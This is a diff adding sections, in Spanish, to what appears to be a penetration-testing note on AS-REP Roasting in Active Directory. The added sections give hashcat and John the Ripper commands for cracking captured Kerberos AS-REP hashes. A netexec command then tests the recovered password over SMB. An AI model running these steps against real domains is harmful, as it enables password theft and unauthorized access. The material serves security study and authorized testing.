@@ -37,3 +37,26 @@ impacket-GetNPUsers -dc-ip <IP_DEL_DC> <NOMBRE_DOMINIO>/<USUARIO_VALIDO> -reques
 
 Para guardar la salida en un archivo y poder trabajar con ella más tarde, usamos la redirección o la opción `-outputfile`:
 
+## Crackeo del ticket
+
+Una vez tenemos los hashes en nuestro fichero, podemos intentar descifrarlos usando [[HASHCAT]] (modo `18200` para AS-REP Roasting) o [[JOHN THE RIPPER]].
+
+### Con Hashcat
+```shell
+hashcat -m 18200 asrep_hashes.txt /ruta/a/wordlist.txt --force
+```
+### Con John the Ripper
+```shell
+john --format=krb5asrep asrep_hashes.txt --wordlist=/ruta/a/wordlist.txt
+```
+
+Si el crackeo tiene éxito, obtendremos la contraseña en texto claro de la cuenta objetivo.
+
+## Validación de credenciales
+Validaremos la credenciales usando la herramienta [[NETEXEC]]
+
+```shell
+nxc smb <IP> -u <user> -p <password>
+```
+
+
